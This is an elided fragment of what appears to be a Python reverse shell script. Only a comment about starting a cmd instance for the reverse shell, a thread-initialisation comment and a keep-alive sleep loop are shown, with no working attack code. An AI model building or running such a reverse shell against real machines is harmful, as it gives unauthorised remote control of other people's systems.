...
# Start a cmd instance to use with the reverse shell
...
# This section inits our function threads
################################################
...
# infinite loop to keep the script alive while the threads are running
while True:
    time.sleep(1)